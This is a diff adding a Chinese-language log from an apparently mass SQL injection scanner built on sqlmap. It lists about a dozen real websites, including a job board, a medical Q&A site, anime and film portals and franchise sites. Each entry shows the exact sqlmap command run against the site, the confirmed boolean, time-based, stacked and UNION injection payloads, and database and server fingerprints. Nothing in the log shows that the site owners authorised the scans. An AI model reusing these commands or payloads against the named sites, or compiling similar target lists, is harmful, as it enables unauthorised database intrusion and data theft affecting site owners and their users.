@@ -1,0 +1,225 @@
+-------------------------------------------------
+发现时间 : 2019-03-12:14:11:01
+网站标题 : 赣鄱人才网江西人才网江西招聘网-每日更新南昌招聘会和江西人才网最新招聘信息!江西艺术剧院每周六举办大型招聘会
+注入网址 : http://gprcw.com/inc/gghtml/gp/pos18329c8a9ed5511278f187ca58c5e2aa.shtml
+执行命令 : D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\python.exe D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\sqlmap\sqlmap.py -u http://gprcw.com/inc/gghtml/gp/pos18329c8a9ed5511278f187ca58c5e2aa*.shtml --batch --thread=10 --random-agent
+
+注入参数(方式) : #1* (URI)
+    注入方式 : stacked queries
+    注入标题 : Microsoft SQL Server/Sybase stacked queries (comment)
+    注入攻击 : http://gprcw.com:80/inc/gghtml/gp/pos18329c8a9ed5511278f187ca58c5e2aa';WAITFOR DELAY '0:0:5'--.shtml
+
+数据库类型 : Microsoft SQL Server
+服务器版本 : Windows 2003 or XP
+服务器语言 : ASP.NET, Microsoft IIS 6.0, ASP
+数据库版本 : Microsoft SQL Server 2014
+
+-------------------------------------------------
+发现时间 : 2019-03-12:14:42:58
+网站标题 : ok电影吧-最新免费电影线观看网站_伦理电影_伦理片_手机在线观看
+注入网址 : http://www.okdy8.com/type/2.html
+执行命令 : D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\python.exe D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\sqlmap\sqlmap.py -u http://www.okdy8.com/type/2*.html --batch --thread=10 --random-agent
+
+注入参数(方式) : #1* (URI)
+    注入方式 : boolean-based blind
+    注入标题 : AND boolean-based blind - WHERE or HAVING clause
+    注入攻击 : http://www.okdy8.com:80/type/2 AND 4910=4910.html
+
+    注入方式 : AND/OR time-based blind
+    注入标题 : MySQL OR time-based blind (ELT)
+    注入攻击 : http://www.okdy8.com:80/type/2 OR ELT(1314=1314,SLEEP(5)).html
+
+数据库类型 : MySQL
+服务器语言 : Nginx, PHP 7.1.20
+数据库版本 : MySQL Unknown
+
+-------------------------------------------------
+发现时间 : 2019-03-12:15:38:43
+网站标题 : 风车动漫－专注动漫的门户网站
+注入网址 : http://fengchedm.com/content/26355.html
+执行命令 : D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\python.exe D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\sqlmap\sqlmap.py -u http://fengchedm.com/content/26355*.html --batch --thread=10 --random-agent
+
+注入参数(方式) : #1* (URI)
+    注入方式 : boolean-based blind
+    注入标题 : AND boolean-based blind - WHERE or HAVING clause
+    注入攻击 : http://fengchedm.com:80/content/26355' AND 8320=8320 AND 'HbeE'='HbeE.html
+
+    注入方式 : stacked queries
+    注入标题 : MySQL > 5.0.11 stacked queries (comment)
+    注入攻击 : http://fengchedm.com:80/content/26355';SELECT SLEEP(5)#.html
+
+    注入方式 : AND/OR time-based blind
+    注入标题 : MySQL >= 5.0.12 OR time-based blind
+    注入攻击 : http://fengchedm.com:80/content/26355' OR SLEEP(5) AND 'OGMN'='OGMN.html
+
+数据库类型 : MySQL
+服务器版本 : Windows 8.1 or 2012 R2
+服务器语言 : ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 8.5
+数据库版本 : MySQL > 5.0.11
+
+-------------------------------------------------
+发现时间 : 2019-03-12:17:58:58
+网站标题 : 樱花动漫－专注动漫的门户网站
+注入网址 : http://yhdongman.com/yinghua/23957.html
+执行命令 : D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\python.exe D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\sqlmap\sqlmap.py -u http://yhdongman.com/yinghua/23957*.html --batch --thread=10 --random-agent
+
+注入参数(方式) : #1* (URI)
+    注入方式 : boolean-based blind
+    注入标题 : AND boolean-based blind - WHERE or HAVING clause
+    注入攻击 : http://yhdongman.com:80/yinghua/23957' AND 1843=1843 AND 'bTlo'='bTlo.html
+
+数据库类型 : MySQL
+服务器版本 : Windows 8.1 or 2012 R2
+服务器语言 : ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 8.5
+数据库版本 : MySQL >= 5.0.0
+
+-------------------------------------------------
+发现时间 : 2019-03-12:18:50:54
+网站标题 : 水宜生_水宜生水杯价格_水宜生水杯-【水宜生杯官方网站】
+注入网址 : http://shuibeiys.com/chanpinjieshaoshow.asp?bh=1418&classcode=5008
+执行命令 : D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\python.exe D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\sqlmap\sqlmap.py -u http://shuibeiys.com/chanpinjieshaoshow.asp?bh=1418^&classcode=5008 --technique B --batch --thread=10 --random-agent
+
+注入参数(方式) : bh (GET)
+    注入方式 : boolean-based blind
+    注入标题 : AND boolean-based blind - WHERE or HAVING clause
+    注入攻击 : bh=1418 AND 3775=3775&classcode=5008
+
+数据库类型 : Microsoft Access
+服务器版本 : Windows 2008 R2 or 7
+服务器语言 : ASP.NET, Microsoft IIS 7.5, ASP
+数据库版本 : Microsoft Access
+
+-------------------------------------------------
+发现时间 : 2019-03-12:18:55:03
+网站标题 : 奇点-链接全球创新医疗
+注入网址 : http://geekheal.com/video-original.php?id=6
+执行命令 : D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\python.exe D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\sqlmap\sqlmap.py -u http://geekheal.com/video-original.php?id=6 --technique B --batch --thread=10 --random-agent
+
+注入参数(方式) : id (GET)
+    注入方式 : boolean-based blind
+    注入标题 : AND boolean-based blind - WHERE or HAVING clause
+    注入攻击 : id=6 AND 6743=6743
+
+数据库类型 : MySQL
+服务器版本 : Linux Ubuntu
+服务器语言 : Nginx 1.10.3
+数据库版本 : MySQL >= 5.0.0
+
+-------------------------------------------------
+发现时间 : 2019-03-12:19:44:27
+网站标题 : 泸州房产网
+注入网址 : http://www.luzhou.cc/xinfang/detail/5.html
+执行命令 : D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\python.exe D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\sqlmap\sqlmap.py -u http://www.luzhou.cc/xinfang/detail/5*.html --batch --thread=10 --random-agent
+
+注入参数(方式) : #1* (URI)
+    注入方式 : boolean-based blind
+    注入标题 : AND boolean-based blind - WHERE or HAVING clause
+    注入攻击 : http://www.luzhou.cc:80/xinfang/detail/5) AND 6103=6103 AND (7580=7580.html
+
+
+存在注入但无法识别数据库版本
+-------------------------------------------------
+发现时间 : 2019-03-12:21:03:24
+网站标题 : 问大夫_帮你在线问医生_在线咨询医生_免费咨询医生
+注入网址 : http://www.wendaifu.com/article/323578.html
+执行命令 : D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\python.exe D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\sqlmap\sqlmap.py -u http://www.wendaifu.com/article/323578*.html --batch --thread=10 --random-agent
+
+注入参数(方式) : #1* (URI)
+    注入方式 : boolean-based blind
+    注入标题 : AND boolean-based blind - WHERE or HAVING clause
+    注入攻击 : http://www.wendaifu.com:80/article/323578) AND 7729=7729 AND (7505=7505.html
+
+    注入方式 : AND/OR time-based blind
+    注入标题 : MySQL >= 5.0.12 AND time-based blind
+    注入攻击 : http://www.wendaifu.com:80/article/323578) AND SLEEP(5) AND (9002=9002.html
+
+    注入方式 : UNION query
+    注入标题 : MySQL UNION query (NULL) - 23 columns
+    注入攻击 : http://www.wendaifu.com:80/article/-2745) UNION ALL SELECT 74,CONCAT(0x7171786271,0x4c50454c46546d4865544d44455a41734e5873464451426d45736546527654516365514d5a774f76,0x717a7a6271),74,74,74,74,74,74,74,74,74,74,74,74,74,74,74,74,74,74,74,74,74#.html
+
+数据库类型 : MySQL
+服务器语言 : Apache
+数据库版本 : MySQL >= 5.0.12
+
+-------------------------------------------------
+发现时间 : 2019-03-12:21:13:37
+网站标题 : 素材中国_免费素材共享平台www.sccnn.com
+注入网址 : http://pages.sccnn.com/view.asp?id=11011
+执行命令 : D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\python.exe D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\sqlmap\sqlmap.py -u http://pages.sccnn.com/view.asp?id=11011 --technique B --batch --thread=10 --random-agent
+
+注入参数(方式) : id (GET)
+    注入方式 : boolean-based blind
+    注入标题 : AND boolean-based blind - WHERE or HAVING clause
+    注入攻击 : id=11011 AND 4797=4797
+
+数据库类型 : Microsoft Access
+服务器版本 : Windows 2003 or XP
+服务器语言 : ASP.NET, Microsoft IIS 6.0, ASP
+数据库版本 : Microsoft Access
+
+-------------------------------------------------
+发现时间 : 2019-04-05:14:33:06
+网站标题 : 098餐饮加盟网_致力于打造安全健康的餐饮加盟平台
+注入网址 : http://wap.098.cn/Public/index/cid/126/id/570.html
+执行命令 : D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\python.exe D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\sqlmap\sqlmap.py -u http://wap.098.cn/Public/index/cid/126/id/570*.html --batch --thread=10 --random-agent
+
+注入参数(方式) : #1* (URI)
+    注入方式 : boolean-based blind
+    注入标题 : AND boolean-based blind - WHERE or HAVING clause
+    注入攻击 : http://wap.098.cn:80/Public/index/cid/126/id/570') AND 9259=9259 AND ('MqcF'='MqcF.html
+
+    注入方式 : stacked queries
+    注入标题 : MySQL > 5.0.11 stacked queries
+    注入攻击 : http://wap.098.cn:80/Public/index/cid/126/id/570');SELECT SLEEP(5) AND ('rHXI'='rHXI.html
+
+    注入方式 : AND/OR time-based blind
+    注入标题 : MySQL >= 5.0.12 AND time-based blind
+    注入攻击 : http://wap.098.cn:80/Public/index/cid/126/id/570') AND SLEEP(5) AND ('NoXI'='NoXI.html
+
+    注入方式 : UNION query
+    注入标题 : Generic UNION query (NULL) - 4 columns
+    注入攻击 : http://wap.098.cn:80/Public/index/cid/126/id/570') UNION ALL SELECT NULL,NULL,CONCAT(0x7162717171,0x4b664e564b557773467446434d4d5453736a425a61644b61784c70676c4f7842586370474a7a7977,0x716a767671),NULL-- yKnZ.html
+
+数据库类型 : MySQL
+服务器语言 : ThinkPHP, Nginx 1.0.14
+数据库版本 : MySQL > 5.0.11
+
+-------------------------------------------------
+发现时间 : 2019-04-05:14:33:47
+网站标题 : 大台北奶茶-台湾著名休闲饮品，奶茶加盟好品牌
+注入网址 : http://szmakalo.com/newsd.php?nid=265
+执行命令 : D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\python.exe D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\sqlmap\sqlmap.py -u http://szmakalo.com/newsd.php?nid=265 --technique B --batch --thread=10 --random-agent
+
+注入参数(方式) : nid (GET)
+    注入方式 : boolean-based blind
+    注入标题 : AND boolean-based blind - WHERE or HAVING clause
+    注入攻击 : nid=265 AND 2064=2064
+
+数据库类型 : MySQL
+服务器语言 : PHP 5.4.45, Apache 2
+数据库版本 : MySQL >= 5.0.0
+
+-------------------------------------------------
+发现时间 : 2019-04-05:14:35:57
+网站标题 : 奶茶加盟_街头茶客品牌加盟官网_源自台湾秘制奶茶工艺,奶茶店加盟首选开创珍珠奶茶加盟店爆卖连锁-街头茶客
+注入网址 : http://www.jtck88.com/index.php/content/index/pid/5.html
+执行命令 : D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\python.exe D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\sqlmap\sqlmap.py -u http://www.jtck88.com/index.php/content/index/pid/5*.html --batch --thread=10 --random-agent
+
+注入参数(方式) : #1* (URI)
+    注入方式 : boolean-based blind
+    注入标题 : AND boolean-based blind - WHERE or HAVING clause
+    注入攻击 : http://www.jtck88.com:80/index.php/content/index/pid/5) AND 7718=7718 AND (8576=8576.html
+
+    注入方式 : AND/OR time-based blind
+    注入标题 : MySQL >= 5.0.12 AND time-based blind
+    注入攻击 : http://www.jtck88.com:80/index.php/content/index/pid/5) AND SLEEP(5) AND (4925=4925.html
+
+    注入方式 : UNION query
+    注入标题 : Generic UNION query (NULL) - 18 columns
+    注入攻击 : http://www.jtck88.com:80/index.php/content/index/pid/-6536) UNION ALL SELECT NULL,CONCAT(0x716b767871,0x62645455766673627753474e67476f5876786b5753525054787767646f794374576267697358786c,0x7170626271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- euSv.html
+
+数据库类型 : MySQL
+服务器版本 : Windows
+服务器语言 : ThinkPHP, Apache 2.4.23
+数据库版本 : MySQL >= 5.0.12
+
